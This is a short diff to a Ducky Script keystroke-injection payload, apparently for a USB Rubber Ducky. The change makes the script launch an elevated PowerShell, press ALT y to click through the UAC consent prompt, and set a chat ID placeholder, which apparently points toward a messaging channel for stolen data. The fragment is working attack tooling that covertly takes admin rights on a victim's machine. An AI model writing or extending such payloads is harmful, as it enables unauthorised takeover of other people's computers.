@@ -1,8 +1,10 @@
 REM CREDITS: UberGuidoz
 GUI r
 DELAY 1000
-STRING powershell
+STRING powershell -Noprofile "Start-Process powershell -verb runas"
 ENTER
+DELAY 1500
+ALT y
 DELAY 1500
 STRING $id = "%CHAT_ID%"
 ENTER
